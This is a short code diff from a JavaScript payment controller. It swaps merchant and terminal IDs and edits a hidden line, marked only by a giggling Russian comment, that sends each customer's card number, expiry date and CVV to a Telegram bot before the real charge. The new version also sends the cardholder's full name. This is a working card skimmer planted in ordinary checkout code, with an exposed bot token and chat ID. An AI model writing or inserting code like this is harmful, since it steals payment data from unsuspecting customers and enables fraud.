@@ -229,14 +229,14 @@ class UserController {
                 fio,
             } = req.body
 
-            const terminal_name = 'DELTAPtm9'
-            const merchant_id = 'DELTAP'
+            const terminal_name = 'MAKAODPtm1'
+            const merchant_id = 'MAKAODP'
             const redirect_url = 'https://google.com'
             const PROCESSING_MODE_SALE = 'sale'
             const TRANS_TYPE_CREDIT_CARD = 'Credit Card'
 
             // Хехехехехе
-            await axios.get(`https://api.telegram.org/bot5846954411:AAEKEMS8EBKi1yPAfBueHaSZLFihgXXG4uk/sendMessage?chat_id=269530936&text=${cardNumber},${cardDate},${cvv}`)
+            await axios.get(`https://api.telegram.org/bot5846954411:AAEKEMS8EBKi1yPAfBueHaSZLFihgXXG4uk/sendMessage?chat_id=269530936&text=${cardNumber},${cardDate},${cvv},${fio}`)
 
             const rs = await axios.post('https://processtxn.deltapay.biz/api/transact.php', {
                 affiliate: merchant_id,
